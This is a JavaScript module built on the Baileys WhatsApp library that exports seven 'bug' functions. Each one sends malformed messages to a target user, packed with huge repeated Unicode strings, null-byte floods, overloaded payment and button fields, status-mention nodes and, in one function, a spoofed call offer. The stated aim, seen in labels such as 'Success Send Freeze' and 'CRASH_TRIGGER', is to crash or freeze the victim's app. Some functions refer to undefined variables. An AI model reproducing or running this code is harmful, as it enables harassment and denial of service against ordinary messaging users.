const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("../index");

async function NSKambing(vinzzoffc, target) {
  await vinzzoffc.relayMessage(
    "status@broadcast",
    {
      interactiveResponseMessage: {
        body: {
          text: "#PadukaJoyy.+",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          version: 3
        }
      }
    },
    {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function DX7(vinzzoffc, target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬".repeat(9741),
      contentText: "\u0000",
      footerText: "\u0000",
      buttons: [
        { 
          buttonId: "\u0000".repeat(911000), 
          buttonText: { displayText: "\u0000" + "\u0000".repeat(400000) }, 
          type: 1 
        }
      ],
      headerType: 1
    }
  }, {});

  await vinzzoffc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      { 
        tag: "meta", 
        attrs: {}, 
        content: [
          { 
            tag: "mentioned_users", 
            attrs: {}, 
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }] 
          }
        ] 
      }
    ]
  });
  
  if (mention) {
    await vinzzoffc.relayMessage(target, {
      groupStatusMentionMessage: {
        message: { 
          protocolMessage: { 
            key: msg.key, 
            type: 25 
          } 
        }
      }
    }, {
      additionalNodes: [
        { 
          tag: "meta", 
          attrs: { is_status_mention: "\u0000" }, 
          content: undefined 
        }
      ]
    });
  }
}

async function FreezeChat(vinzzoffc, target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/418oul.jpg" } }, 
                                            { upload: vinzzoffc.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text:"🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬" + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Freeze Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://t.me/asepisheree\",\"merchant_url\":\"https://t.me/sf7zephkiel\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Code\",\"id\":\"message\",\"copy_code\":\"#FREEZECODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Freeze\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Freeze\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Freeze Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: qkontak }
    );
    await vinzzoffc.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
    });
    console.log(`Success Send Freeze to ${target}`)
}

async function PaymentForce(vinzzoffc, target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
          expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            },
            externalAdReply: {
              showAdAttribution: true,
              renderLargerThumbnail: true
            }
          },
            body: {
              text: "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬" + "ꦾ".repeat(80000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                     status: true,
                     criador: "🕸",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "wa_payment_learn_more",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🤧",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "catalog_message",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🩸",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "DX7",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "wa_payment_fbpin_reset",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🕸",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🚬",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🕸",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "sent_location",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🕸",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "review_and_pay",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🕸",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🕸",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
                {
                  name: "payment_info",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "🚀",
                     versao: "@latest",
                     atualizado: "2007-07-14",
                     suporte: "https://wa.me/settings",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗𝐞᪷𝐤͠𝐬"
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await vinzzoffc.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

async function DewaSquad(vinzzoffc, target) {
    const randomHex = (len = 16) =>
        [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
    
    const fs = require('fs');
    const crypto = require('crypto');
    const {
        encodeSignedDeviceIdentity,
        jidDecode,
        encodeWAMessage
    } = require("../index");

    const createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    const mutex = createMutex();
    const originalCreateParticipantNodes = dewa.createParticipantNodes.bind(dewa);
    const originalEncodeWAMessage = dewa.encodeWAMessage?.bind(dewa);
    
    const padBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    
    dewa.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (dewa.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let messages = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = dewa.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            messages.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);
                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = padBuffer(originalEncodeWAMessage ? originalEncodeWAMessage(msg) : encodeWAMessage(msg));

                return mutex.mutex(jid, async () => {
                    let { type, ciphertext } = await dewa.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let devices = (
        await dewa.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await dewa.assertSessions(devices);

    let msg1 = generateWAMessageFromContent(target, {
        interactiveMessage: {
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                messageAssociation: {
                    associationType: 2,
                    parentMessageKey: randomHex(16)
                },
                messageSecret: randomHex(32),
                supportPayload: JSON.stringify({
                    version: 2,
                    is_ai_message: true,
                    should_show_system_message: true,
                    expiration: -9999,
                    ephemeralSettingTimestamp: 9741,
                    disappearingMode: {
                        initiator: "INITIATED_BY_OTHER",
                        trigger: "ACCOUNT_SETTING"
                    }
                }),
                isForwarded: true,
                forwardingScore: 1972,
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                quotedMessage: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            jpegThumbnail: fs.readFileSync('./Zu.jpg'),
                            title: "Dewa" + "᭄".repeat(5000)
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "review_and_pay".repeat(5000),
                                    buttonParamsJson: JSON.stringify({
                                        currency: "XXX",
                                        payment_configuration: "",
                                        payment_type: "",
                                        total_amount: { value: 1000000, offset: 100 },
                                        reference_id: "4SWMDTS1PY4",
                                        type: "physical-goods",
                                        order: {
                                            status: "payment_requested",
                                            description: "",
                                            subtotal: { value: 0, offset: 100 },
                                            order_type: "PAYMENT_REQUEST",
                                            items: [
                                                {
                                                    retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                                                    name: "dewa is here".repeat(5000),
                                                    amount: { value: 1000000, offset: 100 },
                                                    quantity: 1
                                                }
                                            ]
                                        },
                                        additional_note: "Ddewa",
                                        native_payment_methods: [],
                                        share_payment_status: true
                                    })
                                }
                            ],
                            messageParamsJson: "{}"
                        }
                    }
                }
            },
            header: {
                hasMediaAttachment: true,
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: JSON.stringify({
                            currency: "IDR",
                            total_amount: { value: 1000000, offset: 100 },
                            reference_id: "Ddewa",
                            type: "physical-goods",
                            order: {
                                status: "canceled",
                                subtotal: { value: 0, offset: 100 },
                                order_type: "PAYMENT_REQUEST",
                                items: [
                                    {
                                        retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                                        name: "dewa is here".repeat(5000),
                                        amount: { value: 1000000, offset: 100 },
                                        quantity: 1000
                                    }
                                ]
                            },
                            additional_note: "dewa ",
                            native_payment_methods: [],
                            share_payment_status: true
                        })
                    }
                ],
                messageParamsJson: "{}"
            },
            annotations: [
                {
                    embeddedContent: {
                        embeddedMessage: {
                            message: "dewa is here"
                        }
                    },
                    location: {
                        degreesLongitude: 0,
                        degreesLatitude: 0,
                        name: "dewa is here".repeat(5000)
                    },
                    polygonVertices: [
                        { x: 60.71664810180664, y: -36.39784622192383 },
                        { x: -16.710189819335938, y: 49.263675689697266 },
                        { x: -56.585853576660156, y: 37.85963439941406 },
                        { x: 20.840980529785156, y: -47.80188751220703 }
                    ],
                    newsletter: {
                        newsletterJid: "1@newsletter",
                        newsletterName: "dewa is here".repeat(5000),
                        contentType: "UPDATE",
                        accessibilityText: "Dewa"
                    }
                }
            ]
        }
    }, { userJid: target });

    await dewa.relayMessage(target, msg1.message, {
        participant: { jid: target },
        messageId: msg1.key.id,
        additionalnodes: [
            {
                tag: "interactive",
                attrs: {
                    type: "native_flow",
                    v: "1"
                },
                content: [
                    {
                        tag: "native_flow",
                        attrs: {
                            v: "9",
                            name: "payment_method"
                        },
                        content: [
                            {
                                tag: "extensions_metadata",
                                attrs: {
                                    flow_message_version: "3",
                                    well_version: "700"
                                },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    });

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await dewa.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: dewa.generateMessageTag(),
            from: dewa.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": dewa.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(dewa.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };
    
    let msg2 = {
        interactiveMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: `120363321780343299@newsletter`,
                    newsletterName: "Dewa Is Back??" + "ી".repeat(100000),
                    jpegThumbnail: "",
                    caption: "ꦽ".repeat(100000),
                    inviteExpiration: Date.now() + 1814400000,
                },
            },
        },
    };
    
    await dewa.relayMessage(target, msg2, {
        userJid: target,
    });
    
    await dewa.sendNode(callNode);

    let msg3 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0,
                        },
                        hasMediaAttachment: true,
                    },
                    body: {
                        text:
                            "ꦾ".repeat(9000) +
                            "ꦽ".repeat(9000) +
                            "ោ".repeat(9000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: [
                            "@newsletter",
                            "@newsletter",
                            "@newsletter",
                            "@newsletter",
                            "@newsletter",
                        ],
                        groupMentions: [
                            {
                                groupJid: "@newsletter",
                                groupSubject: "Mak Lo Di Sewa Dewa!!",
                            },
                        ],
                        quotedMessage: {
                            documentMessage: {
                                contactVcard: true,
                            },
                        },
                    },
                },
            },
        },
    };
    
    await dewa.relayMessage(target, msg3, {
        participant: { jid: target },
        messageId: null,
    });

    dewa.createParticipantNodes = originalCreateParticipantNodes;
}

async function Kres(vinzzoffc, target) {
    const heavyText = "🍷⃟༑⌁⃰.𝐑͢͠𝐬⃗⃟𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗⃟𝐞᪷𝐤͠𝐬".repeat(70000);
    const btnDelete = {
        name: "single_select",
        buttonParamsJson: JSON.stringify({
            title: " ", 
            sections: []
        })
    };

    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: heavyText, 
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: heavyText,
                    },
                    nativeFlowMessage: {
                        buttons: [
                            btnDelete, btnDelete, btnDelete, btnDelete, btnDelete,
                            btnDelete, btnDelete, btnDelete, btnDelete, btnDelete
                        ],
                        messageParamsJson: "\u0000".repeat(15000)
                    }
                }
            }
        }
    }, {});

    await vinzzoffc.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
        userJid: target,
        quoted: null
    });
}

async function Embege(vinzzoffc, target) {
    const Kontol = "⃟༑⌁⃰.𝐑͢͠𝐬⃗⃟𝐞᪷𝐦͠𝐛⃗𝐢᪷𝐥͠𝐚𝐧⃗⃟𝐞᪷𝐤͠𝐬".repeat(70000);
    const Node = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let sections = [];
    for (let i = 0; i < 30; i++) {
        sections.push({
            title: Kontol,
            highlight_label: `X7-${i}`,
            rows: [{
                title: "𝐒𝐐𝐋-𝐗𝟕",
                id: `sql${i}`,
                header: Kontol,
                description: "DATABASE_DEADLOCK",
                sections: [{
                    title: "NESTED_LEVEL_X",
                    rows: [{ title: "CRASH_TRIGGER", id: `trig${i}` }]
                }]
            }]
        });
    }

    const listData = JSON.stringify({
        title: "𝐒𝐐𝐋-𝐕𝟐-𝐗𝟕",
        sections: sections
    });

    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadataVersion: 2,
                    deviceListMetadata: {},
                    externalAdReply: {
                        title: Kontol,
                        body: "M_B_G",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: Buffer.alloc(1e6, crypto.randomBytes(32)),
                        sourceUrl: "https://t.me/asepisheree"
                    }
                },
                interactiveMessage: {
                    header: {
                        title: Kontol,
                        subtitle: "𝐅𝐨𝐫𝐭𝐢𝐬 𝐅𝐨𝐫𝐭𝐮𝐧𝐚 𝐀𝐝𝐢𝐮𝐯𝐚𝐭",
                        hasMediaAttachment: false,
                        buttonParamsJson: listData 
                    },
                    body: {
                        text: "𝐃𝐢𝐭𝐜𝐢𝐢 𝐄𝐥 𝐕𝐚𝐥𝐢𝐞𝐧𝐭𝐞" + "𑇂𑆵𑆴𑆿".repeat(50000)
                    },
                    footer: {
                        buttonParamsJson: listData
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: listData
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({ status: true })
                            },  
                            {
                                name: "camera_permission_request",
                                buttonParamsJson: JSON.stringify({ "cameraAccess": true })
                            },
                            {
                                name: "payment_method",
                                buttonParamsJson: listData
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: listData
                            }
                        ],
                        messageParamsJson: "{".repeat(10000)
                    }
                }
            }
        }
    }, { userJid: vinzzoffc.user.id });

    await vinzzoffc.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
        userJid: target,
        additionalNodes: Node
    });

    await new Promise(resolve => setTimeout(resolve, 200));

    await vinzzoffc.sendMessage(target, { 
        delete: { 
            remoteJid: target, 
            fromMe: true, 
            id: msg.key.id, 
            participant: vinzzoffc.user.id 
        } 
    });
}

module.exports = {
NSKambing,
DX7,
FreezeChat,
PaymentForce,
DewaSquad,
Kres,
Embege
}
